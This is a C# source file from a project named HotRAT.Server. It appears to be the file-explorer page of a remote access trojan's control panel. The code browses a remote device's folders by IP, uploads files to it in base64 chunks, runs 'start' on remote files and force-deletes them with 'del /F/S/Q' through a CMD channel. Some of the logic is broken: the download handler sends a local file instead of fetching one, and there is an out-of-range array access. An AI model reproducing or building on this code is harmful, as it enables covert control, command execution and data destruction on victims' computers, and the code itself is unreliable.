using Data;
using iNKORE.UI.WPF.Modern.Common.IconKeys;
using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.Collections.ObjectModel;
using System.IO;
using System.Linq;
using System.Security.Cryptography;
using System.Text;
using System.Threading.Tasks;
using System.Windows;
using System.Windows.Controls;
using System.Windows.Data;
using System.Windows.Documents;
using System.Windows.Input;
using System.Windows.Media;
using System.Windows.Media.Imaging;
using System.Windows.Navigation;

namespace HotRAT.Server.Pages
{
    /// <summary>
    /// FileExplorer.xaml 的交互逻辑
    /// </summary>
    public partial class FileExplorer : Page
    {
        public ObservableCollection<Data.File> Files { get; set; }
        public static string LoadPath { get; set; }
        private static FileExplorer _instance;
        public FileExplorer()
        {
            InitializeComponent();
            _instance = this;
            Files = new ObservableCollection<Data.File>();
            listViewFiles.ItemsSource = Files;
            Loaded += (_, _) =>
            {
                //FolderPathTextBox.Text = LoadPath;
                //LoadFolder(LoadPath);
                if(MainData.SelectDevice == null)
                {
                    Wpf.Ui.Controls.MessageBox msg = new Wpf.Ui.Controls.MessageBox();
                    msg.Content = "No valid instance has been selected.";
                    msg.Title = "Error!!!                 ";
                    msg.Height = 200;
                    msg.Width = 500;
                    msg.ShowDialogAsync().Wait();
                    MainWindow.tabControl.SelectedIndex = 0;
                    return;
                }
                DriveInfo[] allDrives = DriveInfo.GetDrives();
                devices_.Items.Clear();
                foreach (DriveInfo d in allDrives)
                {
                    devices_.Items.Add(d.Name);
                }
            };
        }
        private void LoadFolder(string folderPath)
        {
            Files.Clear();
            try
            {
                var directoryInfo = new DirectoryInfo(folderPath);
                foreach (var fileSystemInfo in directoryInfo.GetFileSystemInfos())
                {
                    var type = fileSystemInfo.GetType().Name == "FileInfo" ? "File" : "Dir";
                    FontIconData ico;
                    if (type == "File")
                        ico = SegoeFluentIcons.FileExplorer;
                    else
                        ico = SegoeFluentIcons.Dictionary;

                    Files.Add(new Data.File()
                    {
                        FileName = fileSystemInfo.Name,
                        ChangeTime = fileSystemInfo.LastWriteTime.ToString(),
                        CreatTime = fileSystemInfo.CreationTime.ToString(),
                        Size = fileSystemInfo.GetType().Name == "FileInfo" ? ((FileInfo)fileSystemInfo).Length : 0,
                        Type = type,
                        Icon = ico
                    });
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show("Error: " + ex.Message);
            }
        }

        public static void LoadClientFolder(string FilesInfo)
        {
            _instance.Dispatcher.Invoke(() =>
            {
                _instance.Files.Clear();
                try
                {
                    string[] lines = FilesInfo.Split(new[] { '\n', '\r' }, StringSplitOptions.RemoveEmptyEntries);

                    foreach (var line in lines)
                    {
                        // 按竖线分割每行数据
                        string[] parts = line.Split("|||");
                        if (parts.Length >= 4)
                        {
                            string fileName = parts[0];
                            string fileType = parts[1];
                            string createdTime = parts[2];
                            string modifiedTime = parts[3];
                            long size = long.Parse(parts[4]);
                            FontIconData ico;
                            if (fileType == "File")
                                ico = SegoeFluentIcons.FileExplorer;
                            else
                                ico = SegoeFluentIcons.Dictionary;

                            _instance.Files.Add(new Data.File()
                            {
                                FileName = fileName,
                                ChangeTime = modifiedTime,
                                CreatTime = createdTime,
                                Size = size,
                                Type = fileType,
                                Icon = ico
                            });
                        }
                    }
                    /*

                     */
                }
                catch (Exception ex)
                {
                    MessageBox.Show("Error: " + ex.Message);
                }
            });

        }

        private async void listViewFiles_MouseDoubleClick(object sender, MouseButtonEventArgs e)
        {
            var file = (Data.File)listViewFiles.SelectedItem;
            if (file == null) return;

            if (file.Type == "Dir")
            {
                LoadPath = Path.Combine(LoadPath, file.FileName);
                FolderPathTextBox.Text = LoadPath;
                //LoadFolder(LoadPath);
                await MainWindow.server.SendDataToClientAsync(MainData.SelectDevice.IP, "FILES|||" + LoadPath + "");
            }
        }

        private void BackPath_Click(object sender, RoutedEventArgs e)
        {
            if (LoadPath.Split('\\').Length > 1)
            {
                if (Directory.Exists(Path.GetDirectoryName(LoadPath)))
                {
                    LoadPath = Path.GetDirectoryName(LoadPath);
                    FolderPathTextBox.Text = LoadPath;
                    //LoadFolder(LoadPath);
                    MainWindow.server.SendDataToClientAsync(MainData.SelectDevice.IP, "FILES|||" + LoadPath + "");
                }
            }
        }

        private void FolderPathTextBox_PreviewKeyDown(object sender, KeyEventArgs e)
        {
            if (e.Key == Key.Enter) 
            {
                if (Directory.Exists(FolderPathTextBox.Text))
                {
                    LoadPath = FolderPathTextBox.Text;
                    //LoadFolder(LoadPath);
                    MainWindow.server.SendDataToClientAsync(MainData.SelectDevice.IP, "FILES|||" + LoadPath + "");
                }
                FolderPathTextBox.Text = LoadPath;
            }
        }

        public static bool DriveExists(string driveName)
        {
            DriveInfo[] allDrives = DriveInfo.GetDrives();

            foreach (DriveInfo d in allDrives)
            {
                if (d.Name == driveName)
                {
                    return true;
                }
            }

            return false;
        }

        private void devices__SelectionChanged(object sender, SelectionChangedEventArgs e)
        {
            if(devices_.SelectedItem != null)
            {
                FolderPathTextBox.Text = devices_.SelectedValue.ToString();
                LoadPath = devices_.SelectedValue.ToString();
                //LoadFolder(LoadPath);
                MainWindow.server.SendDataToClientAsync(MainData.SelectDevice.IP, "FILES|||" + LoadPath + "");
            }
        }

        private void DownloadItem_Click(object sender, RoutedEventArgs e)
        {
            SaveFileDialog saveFileDialog1 = new SaveFileDialog();
            var select = (Data.File)listViewFiles.SelectedItem;
            saveFileDialog1.Filter = "All Files|*.*";
            saveFileDialog1.Title = $"Save {select.FileName}"; 
            saveFileDialog1.FileName = select.FileName; 

            var result = saveFileDialog1.ShowDialog();

            if ((bool)result)
            {
                string filePath = saveFileDialog1.FileName;
                string base64String = Convert.ToBase64String(System.IO.File.ReadAllBytes(filePath));
                MainWindow.server.SendDataToClientAsync(MainData.SelectDevice.IP, $"DL|||{select.FileName}|||{base64String}");
            }
            
        }

        private async void Upload_Click(object sender, RoutedEventArgs e)
        {
            Microsoft.Win32.OpenFileDialog openFileDialog = new Microsoft.Win32.OpenFileDialog();

            openFileDialog.Filter = "All files (*.*)|*.*";

            bool? result = openFileDialog.ShowDialog();

            if (result == true)
            {
                string filePath = openFileDialog.FileName;
                string fileName = System.IO.Path.GetFileName(filePath);
                string folderPath = FolderPathTextBox.Text;

                // 读取整个文件并转换为Base64字符串
                byte[] fileData = System.IO.File.ReadAllBytes(filePath);
                string fileDataBase64 = Convert.ToBase64String(fileData);

                // 分片大小定义
                int chunkSize = 32768; // 分片大小为8192字符

                // 计算总片数
                int totalChunks = (int)Math.Ceiling((double)fileDataBase64.Length / chunkSize);

                // 循环发送每个分片
                for (int i = 0; i < totalChunks; i++)
                {
                    // 计算当前分片内容
                    int startIndex = i * chunkSize;
                    int length = Math.Min(chunkSize, fileDataBase64.Length - startIndex);
                    string fileDataChunk = fileDataBase64.Substring(startIndex, length);

                    // 计算分片的MD5值
                    using (MD5 md5 = MD5.Create())
                    {
                        byte[] chunkBytes = Encoding.UTF8.GetBytes(fileDataChunk);
                        byte[] hashBytes = md5.ComputeHash(chunkBytes);
                        string chunkMd5 = BitConverter.ToString(hashBytes).Replace("-", "").ToLower();

                        // 构建上传信息：UPLOAD|||当前片//总片//当前片md5值|||文件名|||文件路径|分片数据
                        string message = $"UPLOAD|||{i + 1}/{totalChunks}/{chunkMd5}|||{fileName}|||{folderPath}|||{fileDataChunk}";
                        await MainWindow.server.SendDataToClientAsync(MainData.SelectDevice.IP, message);
                        await Task.Delay(50);
                    }
                }
            }
        }



        private void OpenFile_Click(object sender, RoutedEventArgs e)
        {
            var file = (Data.File)listViewFiles.SelectedItem;
            if(file.Type == "File")
                MainWindow.server.SendDataToClientAsync(MainData.SelectDevice.IP, $"CMD|||start \"{Path.Combine(FolderPathTextBox.Text, file.FileName)}\"");
        }

        private void DelFile_Click(object sender, RoutedEventArgs e)
        {
            var file = (Data.File)listViewFiles.SelectedItem;
            MainWindow.server.SendDataToClientAsync(MainData.SelectDevice.IP, $"CMD|||del /F/S/Q \"{Path.Combine(FolderPathTextBox.Text, file.FileName)}\"");
        }
    }
}
